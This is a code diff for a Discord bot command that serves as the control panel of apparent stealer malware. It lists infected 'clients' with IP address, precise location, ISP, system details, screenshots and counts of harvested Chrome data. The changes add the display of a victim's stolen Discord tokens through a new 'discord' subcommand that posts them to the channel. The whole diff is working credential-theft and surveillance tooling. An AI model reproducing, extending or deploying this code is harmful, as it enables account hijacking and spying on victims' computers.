@@ -7,37 +7,42 @@ const Op = db.Sequelize.Op;
 exports.run = (client, message, args) => {
     if (args.length == 0) {
         db.Bots.findAll().then((results) => {
-            const clientsPerPage = 3;
-            let pages = [];
-            let fields = [];
+            if (results.length > 0) {
+                const clientsPerPage = 3;
+                let pages = [];
+                let fields = [];
 
-            for (const [index, element] of results.reverse().entries()) {
-                fields.push({
-                    name: !element.tag ? "No tag" : element.tag,
-                    value: `
-                        **ID**: ${element.id}
-                        **IP Address**: ${element.ipAddress}
-                        **Country**: ${element.country}
-                        **OS**: ${element.operatingSystem}
-                    `,
-                    inline: true,
-                });
+                for (const [index, element] of results.reverse().entries()) {
+                    fields.push({
+                        name: !element.tag ? "No tag" : element.tag,
+                        value: `
+                            **ID**: ${element.id}
+                            **IP Address**: ${element.ipAddress}
+                            **Country**: ${element.country}
+                            **OS**: ${element.operatingSystem}
+                            **Release**: ${element.release}
+                        `,
+                        inline: true,
+                    });
 
-                if (
-                    index % clientsPerPage == 2 ||
-                    index == results.length - 1
-                ) {
-                    const embed = new Discord.MessageEmbed()
-                        .setColor("#0099ff")
-                        .addFields(fields)
-                        .setTimestamp();
+                    if (
+                        index % clientsPerPage == 2 ||
+                        index == results.length - 1
+                    ) {
+                        const embed = new Discord.MessageEmbed()
+                            .setColor("#0099ff")
+                            .addFields(fields)
+                            .setTimestamp();
 
-                    pages.push(embed);
-                    fields = [];
+                        pages.push(embed);
+                        fields = [];
+                    }
                 }
-            }
 
-            paginationEmbed(message, pages);
+                paginationEmbed(message, pages);
+            } else {
+                message.channel.send("No clients connected");
+            }
         });
     } else if (args.length == 1) {
         db.Bots.findAll({
@@ -59,6 +64,11 @@ exports.run = (client, message, args) => {
                         identifier: element.identifier,
                     },
                 });
+                const discordData = await db.Discord.findAll({
+                    where: {
+                        identifier: element.identifier,
+                    },
+                });
                 const screenshotData = await db.Screenshots.findAll({
                     where: {
                         identifier: element.identifier,
@@ -66,7 +76,15 @@ exports.run = (client, message, args) => {
                 });
 
                 const chromeLength = chromeData.length;
-                const screenShotPath = screenshotData[0].link;
+                const tokensLength =
+                    discordData.length > 0
+                        ? discordData[0].tokens.split(/\r\n|\r|\n/).length - 1
+                        : 0;
+                let screenShotPath = "";
+
+                if (screenshotData.length > 0) {
+                    screenShotPath = screenshotData[0].link;
+                }
 
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
@@ -78,7 +96,9 @@ exports.run = (client, message, args) => {
                             **Country**: ${element.country}
                             **Region**: ${element.region}
                             **City**: ${element.city}
-                            **Location**: https://www.google.com/maps/search/?api=1&query=${element.lat},${element.lon}
+                            **Location**: https://www.google.com/maps/search/?api=1&query=${
+                                element.lat
+                            },${element.lon}
                             **ISP**: ${element.isp}
                             **OS**: ${element.operatingSystem}
                             **Release**: ${element.release}
@@ -87,9 +107,11 @@ exports.run = (client, message, args) => {
                             **Processor**: ${element.processor}
                             **Architecture**: ${element.architecture}
                             **Boot Time**: ${element.bootTime}
-                            **Cores**: ${element.cpuCores}
+                            **Cores**: ${
+                                !element.cpuCores ? "Unknown" : element.cpuCores
+                            }
                             **Memory**: ${element.memory}
-                            **Available Info**: \`Chrome ${chromeLength}\``,
+                            **Available Info**: \`Chrome ${chromeLength}\` \`Discord ${tokensLength}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -97,7 +119,6 @@ exports.run = (client, message, args) => {
                     .setTimestamp();
 
                 if (fs.existsSync(screenShotPath)) {
-                    console.log(1);
                     const attachment = new Discord.MessageAttachment(
                         screenShotPath,
                         "screenshot.jpg"
@@ -155,6 +176,39 @@ exports.run = (client, message, args) => {
                     message.channel.send("Client not found");
                 }
             });
+        } else if (args[1] == "discord") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (result.length > 0) {
+                    db.Discord.findAll({
+                        where: {
+                            identifier: result[0].identifier,
+                        },
+                    }).then((results) => {
+                        if (results.length > 0) {
+                            message.channel.send(
+                                "```" + results[0].tokens + "```"
+                            );
+                        } else {
+                            message.channel.send("No Discord tokens found");
+                        }
+                    });
+                } else {
+                    message.channel.send("Client not found");
+                }
+            });
+        } else {
+            message.channel.send("Invalid argument");
         }
     }
 };
